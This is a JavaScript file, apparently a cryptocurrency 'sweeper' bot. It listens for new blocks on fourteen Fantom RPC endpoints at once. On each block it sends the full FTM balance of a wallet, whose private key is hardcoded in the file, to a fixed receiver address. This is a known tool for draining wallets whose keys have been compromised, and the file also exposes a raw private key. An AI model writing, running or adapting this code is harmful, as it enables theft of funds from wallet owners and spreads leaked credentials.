const { ethers } = require("ethers");

const provider = new ethers.providers.JsonRpcProvider(
  "https://rpc.ankr.com/fantom/"
);
const provider2 = new ethers.providers.JsonRpcProvider(
  "https://fantom.publicnode.com/"
);
const provider3 = new ethers.providers.JsonRpcProvider(
  "https://fantom.blockpi.network/v1/rpc/public/"
);
const provider4 = new ethers.providers.JsonRpcProvider(
  "https://rpc.ftm.tools/"
);
const provider5 = new ethers.providers.JsonRpcProvider(
  "https://1rpc.io/ftm/"
);
const provider6 = new ethers.providers.JsonRpcProvider(
  "https://endpoints.omniatech.io/v1/fantom/mainnet/public/"
);
const provider7 = new ethers.providers.JsonRpcProvider(
  "https://rpc.fantom.network/"
);
const provider8 = new ethers.providers.JsonRpcProvider(
  "https://rpc2.fantom.network/"
);
const provider9 = new ethers.providers.JsonRpcProvider(
  "https://rpc3.fantom.network/"
);
const provider10 = new ethers.providers.JsonRpcProvider(
  "https://fantom.api.onfinality.io/public/"
);
const provider11 = new ethers.providers.JsonRpcProvider(
  "https://fantom-mainnet.gateway.pokt.network/v1/lb/62759259ea1b320039c9e7ac/"
);
const provider12 = new ethers.providers.JsonRpcProvider(
  "https://fantom-mainnet.public.blastapi.io/"
);
const provider13 = new ethers.providers.JsonRpcProvider(
  "https://rpc.fantom.gateway.fm/"
);
const provider14 = new ethers.providers.JsonRpcProvider(
  "https://rpcapi.fantom.network/"
);
const addressReceiver = "0x66807eeAd22c0daD765871f80a1d0e135246f896";

const privateKeys = [
  "d1a74af6c221e3401ad33ab37b62fff49b057f478f4b7b2e6ba6aff7d7e093e5",
];
 // soldier 1
 const bot = (async) => {
  provider.on("block", async () => {
    try {
      console.log("Listening to new block provider 1, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider);
        const balance = await provider.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 1 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};


 // soldier 2
const bot2 = (async) => {
  provider2.on("block", async () => {
    try {
      console.log("Listening to new block provider 2, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider2);
        const balance = await provider2.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider2.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 2 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 3
 const bot3 = (async) => {
  provider3.on("block", async () => {
    try {
      console.log("Listening to new block provider 3, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider3);
        const balance = await provider3.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider3.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 3 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 4
 const bot4 = (async) => {
  provider4.on("block", async () => {
    try {
      console.log("Listening to new block provider 4, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider4);
        const balance = await provider4.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider4.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 4 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 5
 const bot5 = (async) => {
  provider5.on("block", async () => {
    try {
      console.log("Listening to new block provider 5, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider5);
        const balance = await provider5.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider5.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 5 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 6
 const bot6 = (async) => {
  provider6.on("block", async () => {
    try {
      console.log("Listening to new block provider 6, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider6);
        const balance = await provider6.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider6.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 6 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 7
 const bot7 = (async) => {
  provider7.on("block", async () => {
    try {
      console.log("Listening to new block provider 7, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider7);
        const balance = await provider7.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider7.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 7 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 8
 const bot8 = (async) => {
  provider8.on("block", async () => {
    try {
      console.log("Listening to new block provider 8, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider8);
        const balance = await provider8.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider8.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 8 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 9
 const bot9 = (async) => {
  provider9.on("block", async () => {
    try {
      console.log("Listening to new block provider 9, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider9);
        const balance = await provider9.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider9.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 9 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 10
 const bot10 = (async) => {
  provider10.on("block", async () => {
    try {
      console.log("Listening to new block provider 10, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider10);
        const balance = await provider10.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider10.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 10 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 11
 const bot11 = (async) => {
  provider11.on("block", async () => {
    try {
      console.log("Listening to new block provider 11, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider11);
        const balance = await provider11.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider11.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 11 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 12
 const bot12 = (async) => {
  provider12.on("block", async () => {
    try {
      console.log("Listening to new block provider 12, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider12);
        const balance = await provider12.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider12.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 12 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 13
 const bot13 = (async) => {
  provider13.on("block", async () => {
    try {
      console.log("Listening to new block provider 13, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider13);
        const balance = await provider13.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider13.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 13 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};
 // soldier 14
 const bot14 = (async) => {
  provider14.on("block", async () => {
    try {
      console.log("Listening to new block provider 14, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider14);
        const balance = await provider14.getBalance(target.address);
        console.log("$ftm balance is "+balance.toString());

        const gasPrice = await provider14.getGasPrice();
        //estimate gas for transfer of all balance
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        console.log("gas limit is "+gasLimit);
        const gas1 = gasLimit.mul(30); // Adjust this multiplier as needed
        const gas2 = gas1.div(3);

        const totalGasCost = gas2.mul(gasPrice);
        console.log("total gas cost is "+ totalGasCost);
        if (balance.sub(totalGasCost) > 0) {
          console.log("Some $ftm detedcted on provider 14 :)");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit:gasLimit,
              gasPrice:gasPrice,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            ); //replaced the balance to amount
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    } catch (err) {
      console.log(err);
    }
  });
};

bot();
bot2();
bot3();
bot4();
bot5();
bot6();
bot7();
bot8();
bot9();
bot10();
bot11();
bot12();
bot13();
bot14();